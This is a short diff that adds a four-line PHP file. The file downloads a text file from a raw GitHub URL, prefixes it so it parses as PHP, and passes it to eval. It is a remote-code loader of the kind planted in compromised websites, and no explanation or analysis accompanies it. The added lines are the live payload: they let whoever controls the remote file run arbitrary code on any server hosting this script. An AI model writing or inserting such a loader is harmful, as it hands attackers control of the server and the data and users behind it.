@@ -1,0 +1,4 @@
+<?php $LanThau = file_get_contents(urldecode('https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alpabadakkali.txt'));
+
+$LanThau = "?> ".$LanThau;
+eval($LanThau);
